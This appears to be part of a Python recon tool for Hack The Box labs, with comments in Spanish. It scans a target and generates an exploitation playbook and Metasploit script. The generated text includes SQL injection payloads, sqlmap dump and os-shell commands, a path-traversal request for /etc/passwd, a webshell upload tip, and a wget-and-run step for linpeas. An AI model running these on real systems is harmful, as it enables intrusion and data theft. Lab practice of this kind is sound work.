    """Extrae [(puerto, servicio, version)] del scan detallado -sCV."""
    out = []
    for line in _read(os.path.join(outdir, "nmap_detailed.txt")).splitlines():
        m = re.match(r"^(\d+)/(?:tcp|udp)\s+open\s+(\S+)\s+(.*)$", line.strip())
        if m:
            out.append((int(m.group(1)), m.group(2), m.group(3).strip()))
    return out

def _gobuster_hits(outdir):
    """Rutas potencialmente interesantes encontradas por gobuster."""
    interesting = ("admin", "login", "upload", "backup", "config", "/db", "dev",
                   "git", "api", "phpmyadmin", "dashboard", "panel", "secret",
                   "private", "phpinfo", "server-status", ".env", "wp-admin",
                   "wp-login", "administrator", "cgi-bin", "console", "debug")
    hits, seen = [], set()
    try:
        for fn in os.listdir(outdir):
            if fn.startswith("gobuster_"):
                for line in _read(os.path.join(outdir, fn)).splitlines():
                    line = line.strip()
                    if line and any(k in line.lower() for k in interesting) and line not in seen:
                        seen.add(line); hits.append(line)
    except Exception:
        pass
    return hits

# Firmas conocidas: (regex, hipotesis, comandos verificacion, terminos msf).
# 'msf' son terminos para `search` en msfconsole (robusto ante cambios de ruta de modulo).
SIGNATURES = [
    (r"vsftpd\s*2\.3\.4", "vsftpd 2.3.4 tiene un backdoor conocido (CVE-2011-2523).",
     ["searchsploit vsftpd 2.3.4"], ["vsftpd 234"]),
    (r"proftpd\s*1\.3\.5", "ProFTPD 1.3.5 es vulnerable a mod_copy (CVE-2015-3306): copia/escritura sin auth.",
     ["searchsploit proftpd 1.3.5"], ["proftpd modcopy"]),
    (r"samba\s*3\.|smbd\s*3\.0", "Samba 3.x puede ser vulnerable a usermap_script (CVE-2007-2447).",
     ["searchsploit samba usermap"], ["samba usermap"]),
    (r"apache\s*tomcat|coyote", "Tomcat: revisa /manager/html con credenciales por defecto para desplegar un WAR.",
     ["curl -s -o /dev/null -w '%{http_code}\\n' -u tomcat:tomcat http://{host}:{web_port}/manager/html"],
     ["tomcat mgr"]),
    (r"jenkins", "Jenkins: revisa /script (consola Groovy) y la version para CVEs.",
     ["curl -s -I http://{host}:{web_port}/login"], ["jenkins script"]),
    (r"phpmyadmin", "phpMyAdmin: prueba root sin password y revisa la version para RCE conocido.",
     ["searchsploit phpmyadmin"], ["phpmyadmin"]),
    (r"wordpress", "WordPress: enumera usuarios, plugins y temas vulnerables.",
     ["wpscan --url http://{host}:{web_port}/ --enumerate vp,vt,u --api-token TU_TOKEN"], ["wordpress"]),
    (r"drupal", "Drupal: revisa la version para Drupalgeddon (CVE-2018-7600 / CVE-2019-6340).",
     ["droopescan scan drupal -u http://{host}:{web_port}/", "searchsploit drupal"], ["drupal"]),
    (r"joomla", "Joomla: enumera con joomscan y revisa la version.",
     ["joomscan --url http://{host}:{web_port}/"], ["joomla"]),
    (r"werkzeug|flask", "Werkzeug/Flask: si el debugger esta activo, /console pide un PIN (a veces derivable).",
     ["curl -s -I http://{host}:{web_port}/console"], ["werkzeug debug"]),
    (r"webmin", "Webmin: revisa la version para CVE-2019-15107 (RCE en password_change).",
     ["searchsploit webmin"], ["webmin"]),
    (r"nostromo\s*1\.9|nhttpd", "Nostromo nhttpd 1.9.x: CVE-2019-16278 (path traversal -> RCE).",
     ["searchsploit nostromo"], ["nostromo"]),
    (r"apache/2\.4\.(49|50)", "Apache 2.4.49/2.4.50: path traversal CVE-2021-41773/42013 (posible RCE).",
     ["curl -s --path-as-is 'http://{host}:{web_port}/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'"],
     ["apache normalize path"]),
    (r"php/8\.1\.0-dev", "PHP 8.1.0-dev lleva un backdoor conocido (cabecera User-Agentt).",
     ["searchsploit php 8.1.0-dev"], ["php dev backdoor"]),
    (r"elasticsearch", "Elasticsearch: revisa version (CVE-2015-1427 en versiones viejas) e indices sin auth.",
     ["curl -s http://{host}:9200/_cat/indices?v"], ["elasticsearch"]),
    (r"redis", "Redis suele quedar sin auth; verifica el acceso antes de nada.",
     ["redis-cli -h {ip} ping", "redis-cli -h {ip} info server"], ["redis"]),
    (r"grafana", "Grafana 8.x: CVE-2021-43798 (path traversal). Revisa la version.",
     ["curl -s -I http://{host}:{web_port}/login"], ["grafana"]),
    (r"gitlab", "GitLab: revisa la version para CVEs de RCE recientes.",
     ["curl -s -I http://{host}:{web_port}/help"], ["gitlab"]),
    (r"jira|confluence|atlassian", "Jira/Confluence: revisa version para SSTI/RCE (p.ej. CVE-2022-26134).",
     [], ["confluence"]),
    (r"heartbleed|openssl/1\.0\.1", "Posible OpenSSL vulnerable a Heartbleed (CVE-2014-0160).",
     ["nmap -p {web_port} --script ssl-heartbleed {ip}"], []),
]

def _web_target(services):
    """Devuelve (scheme, port) del primer servicio web detectado."""
    for p in sorted(services):
        s = services[p].lower()
        if "http" in s or p in (80, 443, 8080, 8000, 8443, 8888, 8081, 3000):
            scheme = "https" if ("https" in s or "ssl" in s or p in (443, 8443)) else "http"
            return scheme, p
    return None, None

def generate_exploitation_playbook(ip, services, outdir):
    """
    Genera EXPLOTACION.md: hipotesis + comandos de enumeracion/diagnostico LISTOS
    para copiar, en base a lo que el recon guardo. Es tu hoja de ruta:
    tu decides que ejecutar. No lanza exploits por ti.
    """
    blob = _fingerprint_blob(outdir)
    versions = _nmap_versions(outdir)
    hits = _gobuster_hits(outdir)
    scheme, web_port = _web_target(services)
    host = sorted(HOSTNAMES, key=len)[0] if HOSTNAMES else ip
    fmt = {"ip": ip, "host": host, "web_port": web_port or 80, "scheme": scheme or "http"}

    L = [
        f"# Playbook de explotacion - {ip}",
        f"_Generado: {time.strftime('%Y-%m-%d %H:%M:%S')}_",
        "",
        "> Hipotesis + comandos de enumeracion/diagnostico para trabajar el box **a mano**.",
        "> Ejecuta solo contra objetivos autorizados (HTB, tu lab).",
        "",
        "## Progreso",
        "- [ ] Foothold (shell inicial)",
        "- [ ] user.txt",
        "- [ ] Escalada de privilegios",
        "- [ ] root.txt",
        "",
        "## Loot / credenciales",
        "| Origen | Usuario | Password / hash | Notas |",
        "|---|---|---|---|",
        "|  |  |  |  |",
        "",
    ]

    if HOSTNAMES:
        L += ["## Hostnames / vhosts", "", "Añade a `/etc/hosts`:", "```"]
        L += [f"{ip} {h}" for h in sorted(HOSTNAMES)]
        L += ["```", ""]

    # --- SQLi confirmada (arriba del todo, es tu foco) ---
    if SQLI_CONFIRMED:
        L += ["## >>> SQLi CONFIRMADA por sqlmap", ""]
        for t, m, d in SQLI_CONFIRMED:
            L += [f"- `{t}`  (metodo {m}, DBMS {d})"]
        L += ["", "Siguientes pasos (elige objetivo de arriba y sustituye TARGET):", "",
              "```bash",
              "# Enumerar y volcar todo",
              "sqlmap -u 'TARGET' --batch --dbs",
              "sqlmap -u 'TARGET' --batch -D NOMBRE_DB --tables",
              "sqlmap -u 'TARGET' --batch -D NOMBRE_DB -T users --dump",
              "# Buscar la flag directamente en toda la BD",
              "sqlmap -u 'TARGET' --batch --dump-all --exclude-sysdbs | grep -iE 'HTB\\{|flag'",
              "# Si el DBMS lo permite, shell de SO / lectura de ficheros:",
              "sqlmap -u 'TARGET' --batch --os-shell",
              "sqlmap -u 'TARGET' --batch --file-read=/etc/passwd",
              "```", ""]

    # --- Hipotesis (firmas que casaron con el fingerprint) ---
    matched = []
    low = blob.lower()
    for rx, hyp, cmds, _msf in SIGNATURES:
        if re.search(rx, low):
            matched.append((hyp, [c.format(**fmt) for c in cmds]))
    L += ["## Hipotesis: vias probables (segun fingerprint)", ""]
    if matched:
        L += ["Firmas que casaron. **Verifica** cada una antes de asumir nada:", ""]
        for hyp, cmds in matched:
            L.append(f"- {hyp}")
            for c in cmds:
                L += ["  ```bash", f"  {c}", "  ```"]
        L.append("")
    else:
        L += ["No salto ninguna firma automatica. Identifica tecnologia+version a mano "
              "(whatweb / nmap) y pasala por `searchsploit`.", ""]

    # --- Versiones detectadas + searchsploit ---
    if versions:
        L += ["## Servicios y versiones detectadas", "",
              "| Puerto | Servicio | Version | Buscar exploits |",
              "|---|---|---|---|"]
        for p, svc, ver in versions:
            clean = re.sub(r"\(.*?\)", "", ver).replace("(", "").replace(")", "").strip()
            m = re.search(r"^(.*?\d+\.\d[\w.\-]*)", clean)
            token = (m.group(1) if m else clean).strip()[:40]
            ss = f"`searchsploit {token}`" if token else "-"
            L.append(f"| {p} | {svc} | {ver or '-'} | {ss} |")
        L.append("")

    # --- Rutas interesantes de gobuster ---
    if hits:
        L += ["## Rutas interesantes encontradas por gobuster", ""]
        L += [f"- `{h}`" for h in hits[:40]]
        L += ["",
              "Que hacer segun lo que aparezca:",
              "- `login` / `admin` -> credenciales por defecto + probar SQLi en el formulario",
              "- `upload` -> subir una webshell del lenguaje permitido por el servidor",
              f"- `.git` -> volcar el repo: `git-dumper http://{host}:{web_port}/.git/ ./src`",
              "- `.env` / `config` -> leer secretos y credenciales de BD",
              "- `phpinfo` / `server-status` -> fuga de informacion util",
              ""]

    # --- Foco: Inyeccion SQL (guia manual) ---
    if scheme:
        b = f"{scheme}://{host}:{web_port}"
        php_paths = []
        try:
            for fn in os.listdir(outdir):
                if fn.startswith("gobuster_"):
                    for line in _read(os.path.join(outdir, fn)).splitlines():
                        mp = re.search(r"(/\S+\.php)", line)
                        if mp and mp.group(1) not in php_paths:
                            php_paths.append(mp.group(1))
        except Exception:
            pass
        php_paths = php_paths[:6] or ["/index.php"]

        L += ["## Inyeccion SQL (foco examen) - guia manual", ""]
        L += ["Prueba manual rapida — mete estos en cada parametro y en los campos de login:", "",
              "```",
              "'      \"      `      \\",
              "' OR '1'='1        ' OR 1=1-- -        admin'-- -",
              "' AND SLEEP(5)-- -    (si tarda ~5s -> SQLi ciega por tiempo)",
              "' UNION SELECT NULL-- -   (ve sumando NULL hasta que deje de dar error)",
              "```", "",
              "Automatizado con sqlmap (login por POST -> captura con Burp a req.txt):", "",
              "```bash"]
        for pp in php_paths:
            L.append(f"sqlmap -u '{b}{pp}?id=1' --batch --level 3 --risk 2")
        L += [
            "sqlmap -r req.txt --batch --level 3 --risk 2",
            f"sqlmap -u '{b}{php_paths[0]}?id=1' --batch --dbs",
            f"sqlmap -u '{b}{php_paths[0]}?id=1' --batch -D NOMBRE_DB --tables",
            f"sqlmap -u '{b}{php_paths[0]}?id=1' --batch -D NOMBRE_DB -T users --dump",
            "```", ""]

    # --- Comandos por servicio (listos para copiar) ---
    L += ["## Comandos por servicio (listos para copiar)", ""]

    if scheme:
        b = f"{scheme}://{host}:{web_port}"
        L += ["### Web", "", "```bash",
              f"whatweb -a3 {b}",
              f"curl -sk -I {b}",
              f"curl -sk {b}/robots.txt",
              f"feroxbuster -u {b} -x php,html,txt,bak",
              f"ffuf -u {scheme}://{ip} -H 'Host: FUZZ.{host}' "
              "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 0",
              "```", ""]

    if _has(services, {139, 445}, ["smb", "netbios", "microsoft-ds"]):
        L += ["### SMB", "", "```bash",
              f"smbmap -H {ip}",
              f"smbclient -N -L //{ip}/",
              f"crackmapexec smb {ip} -u USER -p PASS --shares   # cuando tengas credenciales",
              "```", ""]

    if _has(services, {21}, ["ftp"]):
        L += ["### FTP", "", "```bash",
              f"ftp {ip}          # user: anonymous  pass: anonymous",
              f"wget -m --no-passive ftp://anonymous:anonymous@{ip}/",
              "```", ""]

    if _has(services, {22}, ["ssh"]):
        L += ["### SSH", "", "```bash",
              f"ssh USER@{ip}",
              "#   /home/*/.ssh/id_rsa   (si consigues lectura de archivos)",
              "```", ""]

    if _has(services, {3306, 1433, 5432, 6379, 27017}, ["mysql", "ms-sql", "mssql", "postgres", "redis", "mongo"]):
        L += ["### Bases de datos", "", "```bash",
              f"mysql -h {ip} -u root            # prueba sin password",
              f"redis-cli -h {ip}                # suele estar sin auth: info / keys *",
              f"psql -h {ip} -U postgres         # credenciales por defecto",
              "```", ""]

    # --- Escalada de privilegios (Linux) ---
    L += ["## Escalada de privilegios (Linux) - comandos", "",
          "Con shell ya dentro, enumera de forma sistematica:", "", "```bash",
          "id; sudo -l                                  # sudo -l -> GTFOBins por cada binario",
          "find / -perm -4000 -type f 2>/dev/null       # SUID -> GTFOBins",
          "getcap -r / 2>/dev/null                      # capabilities",
          "crontab -l; cat /etc/crontab; ls -la /etc/cron.*",
          "uname -a; cat /etc/os-release                # kernel/OS -> searchsploit (ultimo recurso)",
          "#   (kali)  python3 -m http.server 80",
          "#   (box)   wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh",
          "```", "",
          "Contrasta cada hallazgo con **GTFOBins** antes de intentar nada.", ""]

    L += ["## Notas libres", "", "_(apunta lo que vas probando y descartando)_", "",
          "## Recursos", "- HackTricks · PayloadsAllTheThings · GTFOBins · revshells.com · searchsploit/Exploit-DB", ""]

    path = os.path.join(outdir, "EXPLOTACION.md")
    with open(path, "w", errors="ignore") as f:
        f.write("\n".join(L) + "\n")
    ok(f"Playbook de explotacion escrito en {path}")
    return path

# ----------------------------- Metasploit: resource script -------------------

def generate_msf_resource(ip, services, outdir):
    """
    Genera msf_<IP>.rc: setea RHOSTS, importa el nmap (XML) a la BD de MSF y
    prepara `search` de modulos segun el fingerprint. Ejecutalo con:
        msfconsole -q -r recon_<IP>/msf_<IP>.rc
    Usa `search` (no rutas fijas de modulo) para no depender de nombres exactos.
    """
    blob = _fingerprint_blob(outdir).lower()
    xml = os.path.abspath(os.path.join(outdir, "nmap_detailed.xml"))
    ws = "htb_" + ip.replace(".", "_")

    L = [
        f"# Resource script de Metasploit - {ip}",
        f"# Generado: {time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"# Uso:  msfconsole -q -r {os.path.join(outdir, f'msf_{ip}.rc')}",
        "",
        f"setg RHOSTS {ip}",
        f"setg RHOST {ip}",
        "setg VERBOSE true",
        f"workspace -a {ws}",
    ]
    if os.path.isfile(xml):
        L += [f"db_import {xml}", "hosts", "services"]
    L += ["", "# --- Modulos sugeridos segun fingerprint (revisa 'info' antes de 'run') ---"]

    seen = set()
    matched_any = False
    for rx, hyp, _cmds, msf_terms in SIGNATURES:
        if re.search(rx, blob) and msf_terms:
            matched_any = True
            L.append(f"# {hyp}")
            for term in msf_terms:
                if term not in seen:
                    seen.add(term)
                    L.append(f"search {term}")
            L.append("")
    if not matched_any:
        L += ["# (Ninguna firma directa) Busquedas genericas por servicio abierto:"]

    # Busquedas genericas por servicio detectado (siempre utiles)
    generic = []
    def add_gen(term):
        if term not in seen:
            seen.add(term); generic.append(f"search {term}")
    for p, s in services.items():
        s = s.lower()
        if "ftp" in s or p == 21: add_gen("type:exploit ftp")
        if "smb" in s or p in (139, 445): add_gen("type:exploit smb")
        if "http" in s or p in (80, 443, 8080): add_gen("type:exploit http")
        if "mysql" in s or p == 3306: add_gen("type:exploit mysql")
        if "ssh" in s or p == 22: add_gen("type:auxiliary ssh login")
    if generic:
        L += generic

    L += ["",
          "# --- Recordatorio de flujo tipico ---",
          "# use <ruta_del_modulo>",
          "# info",
          "# set RHOSTS " + ip,
          "# set LHOST tun0        ; # tu IP de la VPN de HTB",
          "# check                 ; # si el modulo lo soporta",
          "# run",
          "",
          "# Para SQLi manual, Metasploit ayuda poco: usa sqlmap (ver EXPLOTACION.md).",
          ""]

    path = os.path.join(outdir, f"msf_{ip}.rc")
    with open(path, "w", errors="ignore") as f:
        f.write("\n".join(L) + "\n")
    ok(f"Resource script de Metasploit escrito en {path}")
    ok(f"   ->  msfconsole -q -r {path}")
    return path

# ----------------------------- Write-up --------------------------------------

def generate_writeup(ip, outdir):
    """Escribe WRITEUP.md con cada comando ejecutado y su salida, en formato
    'Comando utilizado / Salida' para pegar en un write-up."""
    L = [f"# Write-up - {ip}",
         f"_Generado: {time.strftime('%Y-%m-%d %H:%M:%S')}_", "",
         "Registro automatico de cada comando lanzado por el recon y su salida.",
         "Copia los bloques que necesites.", ""]
    for i, (title, cmd, out) in enumerate(WRITEUP, 1):
        tool = cmd.split()[0] if cmd else "cmd"
        L += [f"## {i}. {tool}",
              "**Comando utilizado:**", "```bash", cmd, "```", "",
              "**Salida:**", "```", out or "(sin salida)", "```", ""]
    path = os.path.join(outdir, "WRITEUP.md")
    with open(path, "w", errors="ignore") as f:
        f.write("\n".join(L) + "\n")
    ok(f"Write-up escrito en {path}  ({len(WRITEUP)} comandos)")
    return path

# ----------------------------- Main ------------------------------------------

def check_tools():
    if not have("nmap"):
        err("Falta 'nmap' (imprescindible). Instalalo y reintenta."); sys.exit(1)
    optional = ["gobuster", "ffuf", "nikto", "whatweb", "sqlmap", "enum4linux-ng",
                "enum4linux", "smbmap", "smbclient", "ftp", "dig", "showmount",
                "rpcinfo", "ldapsearch", "redis-cli", "curl", "snmpwalk", "msfconsole"]
    missing = [t for t in optional if not have(t)]
    if missing:
        warn(f"Opcionales no encontradas (se omiten esos modulos): {', '.join(missing)}")
    if not have("sqlmap"):
        warn("OJO: sin sqlmap no hay FASE 4 (SQLi), que es tu foco. Instala: sudo apt install sqlmap")

def main():
    ap = argparse.ArgumentParser(description="Orquestador de recon para HTB Linux (v3).")
    ap.add_argument("ip", nargs="?", help="IP objetivo (si no se pasa, se pide)")
    ap.add_argument("--quick", action="store_true", help="Solo top-1000 puertos TCP")
    ap.add_argument("--exam", action="store_true", help="Modo examen: foco SQLi + prep Metasploit (sqlmap mas agresivo)")
    ap.add_argument("--sqli-dump", action="store_true", help="Si hay SQLi, intenta volcar la BD (puede pillar la flag)")
    ap.add_argument("--udp", action="store_true", help="Ademas escanea top puertos UDP")
    ap.add_argument("--deep", action="store_true", help="Usa la wordlist media en gobuster (lento)")
    ap.add_argument("--nikto", action="store_true", help="Activa nikto (lento; off por defecto)")
    ap.add_argument("--no-sqli", action="store_true", help="Salta toda la deteccion SQLi (mas rapido)")
    ap.add_argument("--web-wordlist", help="Wordlist propia para gobuster")
    args = ap.parse_args()

    banner("HTB RECON v3  -  enumeracion automatizada (Linux)  |  foco SQLi + Metasploit")
    ip = args.ip
    if not ip:
        try:
            ip = input(f"{C.BOLD}{C.CY}[?] IP objetivo: {C.END}").strip()
        except (EOFError, KeyboardInterrupt):
            print(); sys.exit(0)
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
        err("Eso no parece una IPv4 valida."); sys.exit(1)

    check_tools()
    outdir = f"recon_{ip}"
    os.makedirs(outdir, exist_ok=True)
    info(f"Guardando resultados en ./{outdir}/")

    opts = {
        "quick": args.quick, "udp": args.udp, "nikto": args.nikto, "no_sqli": args.no_sqli,
        "exam": args.exam, "sqli_dump": args.sqli_dump,
        "web_wl": args.web_wordlist or pick_wordlist(deep=args.deep),
    }
    wl_name = os.path.basename(opts["web_wl"]) if opts["web_wl"] else "ninguna"
    info(f"Wordlist web: {C.W}{wl_name}{C.END}  |  examen: {'ON' if args.exam else 'OFF'}  |  "
         f"sqli-dump: {'ON' if args.sqli_dump else 'OFF'}  |  nikto: {'ON' if args.nikto else 'OFF'}")

    services = fast_port_scan(ip, outdir, args.quick)
    if not services:
        sys.exit(0)
    services = detailed_scan(ip, list(services.keys()), outdir)
    dispatch(ip, services, outdir, opts)
    sqli_phase(ip, services, outdir, opts)          # FASE 4: foco examen
    summary_and_report(ip, services, outdir)
    generate_exploitation_playbook(ip, services, outdir)
    generate_msf_resource(ip, services, outdir)     # Metasploit .rc
    generate_writeup(ip, outdir)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        _p(f"\n{C.R}[-] Interrumpido por el usuario.{C.END}"); sys.exit(1)
